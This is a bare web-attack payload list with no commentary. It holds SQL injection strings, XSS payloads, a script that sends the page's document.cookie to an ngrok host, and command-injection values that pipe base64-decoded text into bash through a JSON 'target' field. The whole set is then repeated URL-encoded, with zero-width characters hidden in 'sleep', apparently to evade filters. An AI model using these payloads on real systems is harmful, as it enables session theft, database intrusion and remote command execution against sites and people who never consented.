```
Normal:

';select sleep(5)-- -
") or "1"="1--
" or sleep(5)=1--

';alert('xss');//
<svg/onload=confirm(1)>
<script>new Image().src = "<http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=>" + document.cookie;</script>

{
"target":"\";echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \""
}
&&`sleep 10`#
;echo cGluZyAtYzIgMTAuMTMuNC4y|base64 -d|bash;


html entities encoded:

%27%3Bselect%20sl%E2%80%8B%E2%80%8Be​p(5)%2D%2D%20%2D%20%0D%0A%22%29%20or%20%221%22%3D%221%2D%2D%0D%0A%22%20or%20sl%E2%80%8B%E2%80%8Be​p(5)%3D1%2D%2D
%22%20or%20sl%E2%80%8B%E2%80%8Be​p(5)%3D1%2D%2D
%27%3Balert(%27xss%27)%3B%2F%2F%0D%0A%3Csvg%2Fonload%3D%22confirm(1)%22%3E%0D%0A%3Cscript%3Enew%20Image().src%20%3D%20%22http%3A%2F%2F5.tcp.eu.ngrok.io%3A15257%2Fcool.jpg%3Foutput%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E
%7B%22target%22%3A%22%27%3Becho%20cGluZyAtYzIgMTAuMTMuNC4y%20%7C%20base64%20%2Dd%20%7C%20bash%3B%20%27%22%7D
%26%26%60sl%E2%80%8B%E2%80%8Be​p%2010%60%23%0D%0A%3Becho%20cGluZyAtYzIgMTAuMTMuNC4y%7Cbase64%20%2Dd%7Cbash%3B
```

